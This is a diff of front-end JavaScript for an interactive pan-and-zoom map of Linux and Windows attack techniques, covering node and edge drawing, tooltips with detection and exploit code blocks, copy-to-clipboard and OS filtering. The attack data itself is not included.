+function mkOSHead(id, os, label, x, y) {
+  const el = document.createElement('div');
+  el.className = `node os-head ${os}`;
+  el.dataset.id = id; el.dataset.os = os;
+  el.style.left = x + 'px'; el.style.top = y + 'px';
+  el.style.width = OS_W + 'px'; el.style.justifyContent = 'center';
+  el.textContent = label;
+  universe.appendChild(el); nodeEls[id] = el;
+}
+
+function mkEl(tag, cls) {
+  const e = document.createElement(tag);
+  e.className = cls; return e;
+}
+
+// ── EDGES ────────────────────────────────────────────────────────
+function elCenter(id) {
+  const el = nodeEls[id]; if (!el) return { x:0, y:0 };
+  return {
+    x: parseFloat(el.style.left) + (el.offsetWidth || 120) / 2,
+    y: parseFloat(el.style.top)  + (el.offsetHeight || 36) / 2,
+  };
+}
+function elBottom(id) {
+  const el = nodeEls[id]; if (!el) return { x:0, y:0 };
+  return {
+    x: parseFloat(el.style.left) + (el.offsetWidth || 120) / 2,
+    y: parseFloat(el.style.top)  + (el.offsetHeight || 36),
+  };
+}
+function elTop(id) {
+  const el = nodeEls[id]; if (!el) return { x:0, y:0 };
+  return {
+    x: parseFloat(el.style.left) + (el.offsetWidth || 120) / 2,
+    y: parseFloat(el.style.top),
+  };
+}
+
+function drawEdges() {
+  svg.innerHTML = '';
+
+  // root → OS heads (smooth curve)
+  const rc = elBottom('root');
+  const lhc = elTop('lhead');
+  const whc = elTop('whead');
+  curve(rc, lhc, '#39d353', 2, 0.55);
+  curve(rc, whc, '#7b61ff', 2, 0.55);
+
+  ATTACKS.forEach(a => {
+    const vis = filter === 'all' || filter === a.os;
+    const col = PC[a.prio];
+    const headId = a.os === 'linux' ? 'lhead' : 'whead';
+
+    // OS head → atk: from bottom of head to top of atk
+    const hb = elBottom(headId);
+    const at = elTop(a.id);
+    curveV(hb, at, col, 1.2, vis ? 0.35 : 0.04);
+
+    // atk → each det: short vertical line
+    a.detect.forEach((cmd, di) => {
+      const did = `${a.id}_d${di}`;
+      const ab = elBottom(a.id);
+      const dt = elTop(did);
+      vert(ab, dt, col, 1, vis ? 0.25 : 0.03);
+    });
+  });
+}
+
+function curve(a, b, color, w, op) {
+  const p = document.createElementNS('http://www.w3.org/2000/svg', 'path');
+  const my = (a.y + b.y) / 2;
+  p.setAttribute('d', `M${a.x},${a.y} C${a.x},${my} ${b.x},${my} ${b.x},${b.y}`);
+  p.setAttribute('stroke', color); p.setAttribute('stroke-width', w);
+  p.setAttribute('stroke-opacity', op); p.setAttribute('fill', 'none');
+  svg.appendChild(p);
+}
+function curveV(a, b, color, w, op) {
+  const p = document.createElementNS('http://www.w3.org/2000/svg', 'path');
+  const my = (a.y + b.y) / 2;
+  p.setAttribute('d', `M${a.x},${a.y} C${a.x},${my} ${b.x},${my} ${b.x},${b.y}`);
+  p.setAttribute('stroke', color); p.setAttribute('stroke-width', w);
+  p.setAttribute('stroke-opacity', op); p.setAttribute('fill', 'none');
+  svg.appendChild(p);
+}
+function vert(a, b, color, w, op) {
+  const l = document.createElementNS('http://www.w3.org/2000/svg', 'line');
+  l.setAttribute('x1', a.x); l.setAttribute('y1', a.y);
+  l.setAttribute('x2', b.x); l.setAttribute('y2', b.y);
+  l.setAttribute('stroke', color); l.setAttribute('stroke-width', w);
+  l.setAttribute('stroke-opacity', op); l.setAttribute('stroke-dasharray', '4,3');
+  svg.appendChild(l);
+}
+
+// ── TOOLTIP ──────────────────────────────────────────────────────
+function showTip(a, e) {
+  const tt = document.getElementById('tooltip');
+  const col = PC[a.prio];
+  const osL = a.os === 'linux' ? '🐧 Linux' : '🪟 Windows';
+  tt.innerHTML = `
+    <div class="tt-h">
+      <div class="pbadge" style="background:${col}22;color:${col};border:1px solid ${col}55;width:22px;height:22px;min-width:22px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800">${a.prio}</div>
+      <div>
+        <div class="tt-title">${a.label}</div>
+        <div class="tt-sub" style="color:${col}">${PL[a.prio]} · ${osL}</div>
+      </div>
+    </div>
+    <div class="tt-desc">${a.desc}</div>
+    <div class="tt-sec">🔍 Détection</div>
+    ${a.detect.map(d => codeBlock(d, a.os)).join('')}
+    <div class="tt-sec">⚡ Exploit</div>
+    ${codeBlock(a.exploit, a.os)}
+    ${a.why ? `<div class="tt-why">💡 <span>${a.why}</span></div>` : ''}
+  `;
+  const ttW = 410, ttH = 420;
+  let x = e.clientX + 18, y = e.clientY - 20;
+  if (x + ttW > window.innerWidth - 8) x = e.clientX - ttW - 10;
+  if (y + ttH > window.innerHeight - 8) y = window.innerHeight - ttH - 8;
+  tt.style.left = Math.max(8, x) + 'px';
+  tt.style.top  = Math.max(8, y) + 'px';
+  tt.classList.add('show');
+}
+
+function codeBlock(text, os) {
+  const esc = escH(text);
+  const safe = JSON.stringify(text);
+  return `<div class="cw"><div class="code ${os}" onclick="copyText(${safe},'${os}')">${esc}</div><button class="cpbtn" onclick="copyText(${safe},'${os}')">⎘</button></div>`;
+}
+function escH(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+document.addEventListener('click', e => {
+  const tt = document.getElementById('tooltip');
+  if (!e.target.closest('#tooltip') && !e.target.closest('.node.atk')) tt.classList.remove('show');
+});
+
+// ── COPY + TOAST ─────────────────────────────────────────────────
+let toastT = null;
+function copyText(text, os = 'linux', srcEl = null) {
+  const doCopy = () => {
+    const toast = document.getElementById('toast');
+    toast.textContent = '📋 Copié !';
+    toast.className = 'show' + (os === 'win' ? ' wt' : '');
+    if (srcEl) { srcEl.style.opacity = '0.6'; setTimeout(() => srcEl.style.opacity = '', 250); }
+    clearTimeout(toastT);
+    toastT = setTimeout(() => { toast.className = toast.className.replace('show', '').trim(); }, 1800);
+  };
+  if (navigator.clipboard) {
+    navigator.clipboard.writeText(text).then(doCopy).catch(() => fallback(text, doCopy));
+  } else { fallback(text, doCopy); }
+}
+function fallback(text, cb) {
+  const ta = document.createElement('textarea');
+  ta.value = text; ta.style.cssText = 'position:fixed;opacity:0';
+  document.body.appendChild(ta); ta.select(); document.execCommand('copy');
+  document.body.removeChild(ta); cb();
+}
+
+// ── FILTER ───────────────────────────────────────────────────────
+function setFilter(f) {
+  filter = f;
+  document.getElementById('btn-all').className   = 'tb' + (f==='all'   ? ' al' : '');
+  document.getElementById('btn-linux').className = 'tb' + (f==='linux' ? ' ll' : '');
+  document.getElementById('btn-win').className   = 'tb' + (f==='win'   ? ' wl' : '');
+  Object.keys(nodeEls).forEach(id => {
+    const el = nodeEls[id];
+    const os = el.dataset.os || 'both';
+    const show = f === 'all' || os === f || os === 'both';
+    el.style.opacity = show ? '1' : '0.04';
+    el.style.pointerEvents = show ? 'auto' : 'none';
+  });
+  drawEdges();
+}
+
+// ── PAN / ZOOM ────────────────────────────────────────────────────
+function applyT() { universe.style.transform = `translate(${panX}px,${panY}px) scale(${scale})`; }
+
+// Initial view: center horizontally, small top margin
+panX = window.innerWidth  / 2 - (ROOT_X + ROOT_W / 2);
+panY = 60;
+
+document.addEventListener('mousedown', e => {
+  if (e.target.closest('.node') || e.target.closest('#toolbar') || e.target.closest('#legend') || e.target.closest('#tooltip')) return;
+  isPanning = true; lx = e.clientX; ly = e.clientY;
+  document.body.classList.add('dragging');
+});
+document.addEventListener('mousemove', e => {
+  if (!isPanning) return;
+  panX += e.clientX - lx; panY += e.clientY - ly;
+  lx = e.clientX; ly = e.clientY; applyT();
+});
+document.addEventListener('mouseup', () => { isPanning = false; document.body.classList.remove('dragging'); });
+document.addEventListener('wheel', e => {
+  e.preventDefault();
+  const f = e.deltaY > 0 ? 0.91 : 1.1;
+  const prev = scale;
+  scale = Math.max(0.1, Math.min(3, scale * f));
+  const r = scale / prev;
+  panX = e.clientX - (e.clientX - panX) * r;
+  panY = e.clientY - (e.clientY - panY) * r;
+  applyT();
+}, { passive: false });
+function resetView() { panX = window.innerWidth / 2 - (ROOT_X + ROOT_W / 2); panY = 60; scale = 1; applyT(); }
+function zoomBy(f) { scale = Math.max(0.1, Math.min(3, scale * f)); applyT(); }
+
+// ── INIT ─────────────────────────────────────────────────────────
+build();
+applyT();
+</script>
+</body>
+</html>
